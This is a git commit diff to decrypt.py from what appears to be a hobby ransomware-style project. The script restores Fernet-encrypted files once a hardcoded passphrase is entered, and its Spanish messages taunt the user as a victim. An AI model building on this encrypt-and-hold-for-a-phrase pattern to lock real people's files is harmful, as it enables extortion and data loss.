e0432fc384e22aba91c6a516193bf74c15a72f4c
Otto <93530491+OttoVazquez1@users.noreply.github.com>
2023-03-14 17:32:57 -0300

    Updated decrypt.py

--- decrypt.py
+++ decrypt.py
@@ -13,16 +13,21 @@ with open("thekey.key", "rb") as key:
     secretkey = key.read()
 
 secretphrase = "123"
-
 user_phrase = input("Pone la super mega clave secreta flaquito\n")
 
-if user_phrase == secretphrase:
-    for file in files:
-        with open(file, "rb") as thefile:
-            contents = thefile.read()
-        contents_decrypted = Fernet(secretkey).decrypt(contents)
-        with open(file, "wb") as thefile:
-            thefile.write(contents_decrypted)
-    print("Linda pa, safaste por hoy cuchaste? Pero tampoco te hagas el vivo por que sos boleta de nuevo ")
-else:
-    print("JAJAJA EN SERIO PENSASTE QUE ERA ESA? Mamita, proba de vuelta dale")
+try:
+    while True:
+        if user_phrase == secretphrase:
+            for file in files:
+                with open(file, "rb") as thefile:
+                    contents = thefile.read()
+                contents_decrypted = Fernet(secretkey).decrypt(contents)
+                with open(file, "wb") as thefile:
+                    thefile.write(contents_decrypted)
+            print("Linda pa, safaste por hoy cuchaste? Pero tampoco te hagas el vivo por que sos boleta de nuevo ")
+            break
+        else:
+            user_phrase = input("JAJAJA EN SERIO PENSASTE QUE ERA ESA? Mamita, proba de vuelta dale\n")
+            continue
+except:
+    print("Parece que ya tenias todo desencriptado y no te diste cuenta flaquito...")
